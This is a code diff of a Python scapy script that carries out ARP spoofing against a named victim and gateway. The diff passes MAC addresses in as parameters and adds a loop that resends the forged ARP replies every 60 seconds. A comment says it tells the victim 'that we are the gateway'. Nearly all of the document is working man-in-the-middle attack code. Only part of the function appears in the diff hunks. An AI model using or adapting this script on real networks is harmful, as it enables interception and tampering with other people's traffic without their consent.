@@ -1,17 +1,8 @@
 from scapy.all import * 
+import time
 
-#getting mac address of a machine using the ip
-def get_mac_address(ip):
+def gateway_spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface):
 
-    result, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
-    if result:
-        return result[0][1].src
-    
-def gateway_spoof(ipGateway, ipAttacker, ipVictim, interface):
-
-    macGateway = get_mac_address(ipGateway)
-    macAttacker = '08:00:27:0B:33:F8'
-    macVictim = get_mac_address(ipVictim)
 
     #telling the victim that we are the gateway
     arpVictim = Ether()/ARP()
@@ -32,5 +23,9 @@ def gateway_spoof(ipGateway, ipAttacker, ipVictim, interface):
     sendp(arpVictim, iface=interface)
     sendp(arpGateway, iface=interface)
 
-    print("Target: {} - {} is-at {}".format(ipAttacker, ipGateway, macAttacker))
-    print("Target: {} - {} is-at {}".format(ipAttacker, ipVictim, macAttacker))
+    
+
+def spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface):
+    while True:
+        gateway_spoof(ipGateway, ipAttacker, ipVictim, macGateway, macAttacker, macVictim, interface)
+        time.sleep(60)
